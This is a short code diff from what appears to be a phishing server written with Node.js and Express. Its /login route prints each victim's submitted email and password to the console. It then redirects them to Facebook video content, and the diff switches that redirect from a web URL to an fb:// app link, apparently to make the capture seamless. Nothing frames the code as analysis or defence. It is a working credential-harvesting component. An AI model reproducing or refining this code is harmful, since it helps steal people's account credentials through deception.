@@ -33,7 +33,7 @@ app.post('/login', (req, res) => {
   console.log(`Email: ${email} | Password: ${password}`);
 
   // Redirect user to Facebook reels
-  res.redirect('https://www.facebook.com/watch/?ref=search&v=1523571681725176&external_log_id=77a3bccd-1b01-4826-9379-fd688744ba17&q=%D8%A7%D9%84%D9%88%D9%86%20%D9%85%D8%A7%D8%B3%D9%83%20reel');
+  res.redirect('fb://video/199055703637330'); // Extracted video ID
 });
 
 // Start server and make it accessible on the network
